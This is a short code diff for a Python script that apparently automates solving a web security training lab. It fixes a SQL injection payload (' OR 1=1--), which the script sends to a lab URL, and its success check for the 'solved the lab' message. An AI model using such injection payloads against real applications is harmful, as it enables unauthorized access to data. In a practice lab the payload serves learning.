@@ -6,7 +6,7 @@ import time
 class WebChecker:
 	def __init__(self):
 		self.response = None
-		self.sqli = ' OR 1=1--'
+		self.sqli = '\' OR 1=1--'
 
 	def check_alive(self, url):
 		self.url = url
@@ -17,10 +17,15 @@ class WebChecker:
 			raise Exception('Web server seems to be down')
 
 	def check_sqli(self, html_text):
-		checked_html = self.soup.find(string="Congratulations, you solved the lab!")
-		if checked_html == 'None':
-			raise Exception('Failed')
-		print(checked_html)
+		try:
+			checked_html = self.soup.find(string='Congratulations, you solved the lab!')
+			if checked_html is None:
+				raise Exception('SQLi error')
+			print(checked_html)
+		except Exception as e:
+			print(f'Error',{e})
+			return None
+
 
 	def find_hrefs(self):
 		self.soup = BeautifulSoup(self.response.text, features="html.parser")
@@ -39,7 +44,7 @@ class WebChecker:
 
 	def main(self):
 		parser = argparse.ArgumentParser()
-		parser.add_argument("url", type=str, help="Url of the lab")
+		parser.add_argument('url', type=str, help='Url of the lab')
 		args = parser.parse_args()
 		self.check_alive(args.url)
 		self.find_hrefs()
